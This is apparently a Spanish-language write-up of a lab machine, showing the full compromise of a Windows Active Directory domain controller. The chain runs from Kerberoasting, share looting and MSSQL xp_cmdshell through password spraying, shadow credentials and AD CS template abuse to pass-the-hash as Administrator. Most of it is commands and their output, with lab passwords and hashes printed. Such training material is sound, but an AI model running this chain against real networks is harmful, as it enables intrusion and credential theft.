As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su

# Enumeration

>Realizamos un escaneo de puertos TCP con mi herramienta automatizada de escaneo:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.231.236
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49693,49694,49695,49708,49726,49747
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-21 18:57:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-21T18:58:58+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-21T18:58:58+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.231.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-04-21T18:58:58+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-21T18:56:36
| Not valid after:  2055-04-21T18:56:36
| MD5:   1743:9516:fcd2:c290:bf6f:8273:bb89:14af
|_SHA-1: e30a:0e22:660a:0e52:e591:b629:f77b:e718:70cb:447c
| ms-sql-ntlm-info: 
|   10.129.231.236:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-21T18:58:58+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
|_ssl-date: 2025-04-21T18:58:58+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49747/tcp open  msrpc         Microsoft Windows RPC
| smb2-time: 
|   date: 2025-04-21T18:58:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.231.236 2>/dev/null
SMB         10.129.231.236  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo "10.129.231.236 DC01.sequel.htb sequel.htb" >> /etc/hosts
```

>Al tratar de hacer un Kerberoast vemos que existen 2 SPN que nos permiten obtener el ticket TGS de dos usuarios, sql_svc y ca_svc:

```bash
┌──(kali㉿jbkira)-[~]
└─$ impacket-GetUserSPNs -dc-ip 10.129.231.236 sequel.htb/rose:KxEPkKe6R8su -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName     Name     MemberOf                                              PasswordLastSet             LastLogon                   Delegation 
-----------------------  -------  ----------------------------------------------------  --------------------------  --------------------------  ----------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb  2024-06-09 03:58:42.689521  2025-04-21 14:56:33.384126             
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb          2025-04-21 15:02:33.081108  2024-06-09 13:14:42.333365             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$11620869f22d64b929d610a93dc41be9$4bbf5c148ec768559b7180e2a3452d80aa9e18fed26f98a393109342b4973c9f41cf3b60b3c30ed1b0b1660d87466e4de6172e57251069764f615cbb12c780e93620e7be6d8583b3294cebf624f22ded1fdb8ace7fa0fa15eacbb8360b41460e42f9f8de1bb1dcbfdade5cba0b7de1e1bc8bdd6a60f5b23743b76ba4f4f8edb702b9c0b3754596fe48307fe82c1357675590930709944710b77e77ccb8d724521e19105150bf9ff7cf2a2e05e446ad36af0ab5402cf1512cfac1f896536cdfc953d5c78187062bb115ff0ae30da6d5ca80a45fcb0ba33165e9949c74f17ab3e4b639f5f00642c069d9ac90f0f5095517427e61468a34521b6b5b944fb8ea36f85049a82bc3a077d7c974a92d6a071b4278888c991cf12ee86f6bee26f81414e2f0a41cd5eb0a08d15d01879681fc030d112a806dd635f2f449d5358f8c5a2b42d46c91bb55a1f44f8a4c413bd3d98391d9194e85f8d181d5672c64920cc0a2b03d2c273fd3ac8a9d6613f169b74d6f25670164eaea4e65d82571df2560462d3dd04ac6df7abef60de00eb98dbfbcec4a8d9b015cdb258ee2b80dcf7d1dfbae26eb9196b3e20f1d57c1fe3b1f85151b6f947f634f552a4f74ba5696385e98952112a06227c8c5aa64295642eac91b7de9161c12796b282e2d3f27c0249b77e579644cf1a120a1fec2fe4883f33eec1f4122d70121ebe0a6f864c1a66de29b2a5b66757bcec6a678db06ba3d023103ac9966cc7159bd4799326202b148f6f68b6f20665eba7d352ec64ecd986fc4a9f5f1f13b50208ff958859916b763c200c75f39a13ab8b7f7f3749086bad6727342f342f117bde649e69b55cb5ea885bdf8e61c30d07d9c732c7bf40df55fa36d79f6e24f3dd8879ae784cac6c602463214047313a5488ed38df0b83726116e6d5821f97a6d19ac2b470fe552257ff443749f2746231ef4d0a6eda5ca377c61262e6f656368a3f0b97ca451b29c612a9602aa50d07a342ab0d5cc60ad2ffdd880aa88a83b9c9174a762a3287427d3118e550ede78b83ffb071e930882bc3abff086fb1236763ac407f90e52578fb117f8e85abf2abdd02c38731e57f583e899964d3445f9dfb980ec9415e8cb7d398ac71249ebfc96d27de6b738a87f5aaf014e14b8ca4c868b692acbd4b1d80e50c98ca1dad5e963d61c709a9f3148c1f04a97e08816e63b40893571fc98e5f7e0c1ecdfd2a86d3473bb325f9e0f4109ee5e1679eab17b5260be33a710a869b94239b5dd12fd68415c2a940050814ac3d7373ae053351fb3d3629e2512e7bbea1fe33134209d67f1a7b6c4442f67b0914e2a9bd5c2af50d31898b327ecbd5dc3a1e28dc96463dfb956d47757c52380d4d6cac88424ec6d5e2a3aa7bd8010e25bb6ff098be6b12a258564d6abf5ad7574a858e391
$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$059912b694c91d20d081f775ad16bc14$d1879b61d53fc8447e04792c82e8d75237dd956d5aac31ef45723af6fbe136db32d5f3d020fb90b3e28fde1b4746b8a6ed5366bf48206c6367b41928213f46017e2047c1b8efd4cf275718a9d91e9b70dc29d6745a0c1478602cc969e5541cd341aaba863cb1c33ea501d13982e942bc05d8af4b00c335f1960ac7686f867a4fe8a808ef342cb67991e60a1f172eae1bcb97cac008a2e515888a22627aeabe77c7637fae439d14d772a6cea4bf5cf2e5353706782144f81ae21bfc1828152c9894a13e572a62964fddba860b40bcb0c5ff8ad0044baaa0e24869f32b244e44dbbe77866e281e352e3f4c0b2bcf74639057c6f8bfc6b444f0ab0ce5a82c3cff7cd97f5c4386f6a5a14bd3f58c213d0f4b9622ecbb4bc96f8e0aab42097bd0bb1307f9354b0d59c17b5b56b3f06e693e948de1910669d19fb96160647d052c3588f30762558ab6d5e3847b63526c0bc3ea9a0b76421e9dcd33f63fc1a3dd7ff4f5be3a130e542276ac7781e0caf10f00badd92ce6f7f63e4054d2b2c663debcb664d02d304012366228277ba457e40b8d3eede8e07c15d846cc5a4d6e02903e8976705855e021e324aecc817c84084c83804df59a19721d38b8c08a8ee92df09363b6912955337b2fcf3191bc14b78d60dfe1737aa368155862d7247ed673e11a14888493e570d88a3422bc63bf831f98c58828d1bfb56e096c773e54355b8222711d0892f525ad1fa13caaf16b11fc866b0f19d28a041cac8b411a0b9a12a8cad960f08725ffafe4f391e5cad23cd12140c1bf34d3da7aa211e7f9dcfdad4857133eba582de0d48d0d15fd1717aeaedf448ce844d5649f9f89b6f17444dba4504a8e724539f25810685e8751644a000e0cc2b3b883df0b7b3f4622de620eff80660ae49aee06a07b4e72652a9db362bd46f66a5f48ea3f6e4af1781a9d73eb3fc6e118926cb9bc61619b9b30a0950a2731f3e4aa3396b76a67026d752b1d4656bc672483ea8e7729383401240471b441d2d1ab746a1639a8694a3b2700f46b79669b631f5ed34384e5eb6f6f60cb80a655b22bb8fe450322a3cac28bb6680117a269abc2aad3f25a9b61dbf1e2b3b666d2bfde7eb2e17149e0d073cf334631e82dbfb369e96549ca887c3daabd071da44441b5bcd25cbff516a07ae4bbc0540c8561ca02cfb22d18e9d03e63a8d4b33b96c76acd62998a042a37856a8e873510ebd029100106474d1e5770160081269db4882ad856b7ac30dd74c626d5378af97edd258a618a729354d628325a1bb224f1a6df75a52172af1f25ece69193449da0f669c22c3671fe0f4db23b84e94e03ff9afc838e6247ec02a4c301e877253cde41fe3661e49d2ed07f255131fb4abcf740e93d39aedc5458b4c9a30268817dd85a367b0079ad1a0db9e30716eae64
```

>Vamos a crackearlos con hashcat empleando la máscara correspondiente, es decir, la 13100, tras emplear el rockyou con ambos hashes ninguno es crackeable facilmente.

>Vamos a obtener archivos para analizar con bloodhound empleando el collector bloodhound-python:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ bloodhound-python -u 'rose' -ns 10.129.231.236 -d sequel.htb -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
Password: 
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 12S
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ zip escapetwo.zip 2025*
  adding: 20250421150856_computers.json (deflated 73%)
  adding: 20250421150856_containers.json (deflated 93%)
  adding: 20250421150856_domains.json (deflated 76%)
  adding: 20250421150856_gpos.json (deflated 85%)
  adding: 20250421150856_groups.json (deflated 94%)
  adding: 20250421150856_ous.json (deflated 68%)
  adding: 20250421150856_users.json (deflated 93%)
```

>Abrimos bloodhound, iniciamos el servicio de base de datos neo4j e importamos el archivo zip a bloodhound:

```bash
sudo neo4j start
bloodhound &>/dev/null & disown
```

>Pero al analizarlo, con el usuario que tenemos no hay ningún dato interesante.

>Si tratamos de listar las shares con el usuario que nos han brindado vemos varias que son accesibles, siendo la de Accounting Department la más interesante:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.231.236 -u 'rose' -p 'KxEPkKe6R8su' --shares 2>/dev/null
SMB         10.129.231.236  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.236  445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.129.231.236  445    DC01             [+] Enumerated shares
SMB         10.129.231.236  445    DC01             Share           Permissions     Remark
SMB         10.129.231.236  445    DC01             -----           -----------     ------
SMB         10.129.231.236  445    DC01             Accounting Department READ            
SMB         10.129.231.236  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.231.236  445    DC01             C$                              Default share
SMB         10.129.231.236  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.231.236  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.231.236  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.231.236  445    DC01             Users           READ  
```

>Aquí vemos una hoja de cálculo de excel llamada Accounts que probablemente contenga credenciales:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ smbclient \\\\10.129.231.236\\'Accounting Department' -U "rose" 
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

                6367231 blocks of size 4096. 816304 blocks available
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (15.5 KiloBytes/sec) (average 15.5 KiloBytes/sec)
```

>En este archivo podemos encontrar las siguientes credenciales:

```
angela:0fwz7Q4mSpurIt99
oscar:86LxLBMgEWaKUnBG
kevin:Md9Wlq1E5bZnVDVo
sa:MSSQLP@ssw0rd!
```

>De estas una que destaca es la del usuario sa que suele ser empleado en las bases de datos MSSQL, vamos a probar a conectarnos mediante la herramienta de Impacket mssqlclient

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ impacket-mssqlclient 'sa:MSSQLP@ssw0rd!@10.129.231.236'              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 
```

>Aquí podemos habilitar xp_cmdshell para poder ejecutar comandos de forma remota:

```bash
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> xp_cmdshell "whoami"
output           
--------------   
sequel\sql_svc
```

>Si enumeramos los archivos del sistema, vemos un directorio no convencional que contiene la contraseña en texto plano del usuario sql_svc:

```powershell
SQL (sa  dbo@master)> xp_cmdshell "type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"
output                                              
-------------------------------------------------   
[OPTIONS]                                           
<SNIP>
SQLSVCACCOUNT="SEQUEL\sql_svc"                      

SQLSVCPASSWORD="WqSZAF6CysDQbGb3"                   

SQLSYSADMINACCOUNTS="SEQUEL\Administrator"          

SECURITYMODE="SQL"                                  

SAPWD="MSSQLP@ssw0rd!"                              

<SNIP>
```

>Vamos a probar si son válidas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ crackmapexec smb 10.129.231.236 -u 'sql_svc' -p 'WqSZAF6CysDQbGb3' 2>/dev/null
SMB         10.129.231.236  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.236  445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
```

>Vemos que son válidas así que vamos a ver si algún otro usuario del dominio posee la misma contraseña, para ello necesitamos previamente una lista con los usuarios del dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ crackmapexec smb 10.129.231.236 -u 'sql_svc' -p 'WqSZAF6CysDQbGb3' --users 2>/dev/null 
SMB         10.129.231.236  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.236  445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3 
SMB         10.129.231.236  445    DC01             [+] Enumerated domain user(s)
SMB         10.129.231.236  445    DC01             sequel.htb\ca_svc                         badpwdcount: 0 desc: 
SMB         10.129.231.236  445    DC01             sequel.htb\rose                           badpwdcount: 0 desc: 
SMB         10.129.231.236  445    DC01             sequel.htb\sql_svc                        badpwdcount: 0 desc: 
SMB         10.129.231.236  445    DC01             sequel.htb\oscar                          badpwdcount: 2 desc: 
SMB         10.129.231.236  445    DC01             sequel.htb\ryan                           badpwdcount: 0 desc: 
SMB         10.129.231.236  445    DC01             sequel.htb\michael                        badpwdcount: 1 desc: 
SMB         10.129.231.236  445    DC01             sequel.htb\krbtgt                         badpwdcount: 1 desc: Key Distribution Center Service Account
SMB         10.129.231.236  445    DC01             sequel.htb\Guest                          badpwdcount: 1 desc: Built-in account for guest access to the computer/domain
SMB         10.129.231.236  445    DC01             sequel.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

>Vamos a tratar el texto para quedarnos solo con los usuarios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ cat users | awk '{print $2}' FS='\\' | awk '{print $1}' FS=" "
ca_svc
rose
sql_svc
oscar
ryan
michael
krbtgt
Guest
Administrator
```

>Ahora si tratamos de hacer el Password Spray vemos que el usuario ryan usa esa misma contraseña:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ kerbrute passwordspray -d sequel.htb --dc 10.129.231.236 valid_users WqSZAF6CysDQbGb3

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/21/25 - Ronnie Flathers @ropnop

2025/04/21 15:42:00 >  Using KDC(s):
2025/04/21 15:42:00 >   10.129.231.236:88

2025/04/21 15:42:00 >  [+] VALID LOGIN:  sql_svc@sequel.htb:WqSZAF6CysDQbGb3
2025/04/21 15:42:00 >  [+] VALID LOGIN:  ryan@sequel.htb:WqSZAF6CysDQbGb3
2025/04/21 15:42:00 >  Done! Tested 9 logins (2 successes) in 0.253 seconds
```

>Vemos que este usuario tiene permisos WriteOwner sobre el usuario ca_svc, el cual lo podemos explotar para obtener acceso a dicha cuenta:

![image](https://github.com/user-attachments/assets/5f4cb418-bfd5-4257-900b-655716a12cc5)

>También vemos que pertenece al grupo Remote Management Users, grupo el cual podemos abusar para acceder como este usuario al DC mediante WinRM:

![image](https://github.com/user-attachments/assets/3ceae475-d49e-4bb6-a61a-96d2ea116069)

>Accedemos al DC por WinRM y vemos la flag user.txt:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ evil-winrm -i 10.129.231.236 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
                                        
<SNIP>

*Evil-WinRM* PS C:\Users\ryan\Documents> ls ../Desktop


    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/21/2025  11:56 AM             34 user.txt
```

# Privilege Escalation

>Para abusar los privilegios que tiene el usuario ryan sobre el usuario ca_svc deberemos hacer un Shadow Credential Attack:

>Primero, cambiamos el ownership de la cuenta:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```

>Después, cambiamos las ACL para garantizarnos FullControl sobre la cuenta:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb/ryan:WqSZAF6CysDQbGb3'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250421-155518.bak
[*] DACL modified successfully!
```

>Ahora emplearemos pywhisker para crear un certificado que nos permita pedir el TGT del usuario ca_svc:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ pywhisker -d sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3' --target "CA_SVC" --action "add" --filename CACert --export PEM

[*] Searching for the target account
[*] Target user found: CN=Certification Authority,CN=Users,DC=sequel,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: da2bde06-7cf3-c8fc-f13b-a248811a798b
[*] Updating the msDS-KeyCredentialLink attribute of CA_SVC
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PEM certificate at path: CACert_cert.pem
[+] Saved PEM private key at path: CACert_priv.pem
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

>Juntamos los certificados creando uno .pfx:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ openssl pkcs12 -export -out cert.pfx -inkey CACert_priv.pem -in CACert_cert.pem                                  

Enter Export Password:
Verifying - Enter Export Password:
```

>Empleamos certipy y obtenemos el hash NTLM del usuario y un archivo ccache que podemos emplear para hacer Pass-The-Ticket

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ certipy auth -pfx cert.pfx -username ca_svc -domain sequel.htb -dc-ip 10.129.231.236 -ptt

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to inject ticket into session
[-] Not running on Windows platform. Aborting
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Got hash for 'ca_svc@sequel.htb': aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce
```

>Vamos a revisar si posee vulnerabilidades de AD CS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ certipy-ad find -vulnerable -u ca_svc@sequel.htb -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.231.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250421162050_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250421162050_Certipy.txt'
[*] Saved JSON output to '20250421162050_Certipy.json'
```

>Si abrimos el archivo json resultante vemos que es vulnerable a :

```bash
"[!] Vulnerabilities": {
        "ESC4": "'SEQUEL.HTB\\\\Cert Publishers' has dangerous permissions"
```

>Como es vulnerable vamos a realizar un ataque ECS1, para ello, primero creamos un backup de la template:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ certipy-ad template -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -save-old

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

>Después, deberemos realizar el ataque ECS1, dándonos un certificado .pfx del administrador:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ certipy-ad req -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

>Por último, empleamos el certificado resultante para obtener el hash NTLM del usuario administrador de la siguiente forma:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ certipy-ad auth -pfx administrator.pfx -domain sequel.htb

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

>Ahora empleamos este hash para hacer un PTH para loguearnos mediante evil-winrm como el usuario administrador en el DC, donde podemos ver la flag root.txt:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
└─$ evil-winrm -i 10.129.231.236 -u 'Administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'

<SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/21/2025  11:56 AM             34 root.txt
```

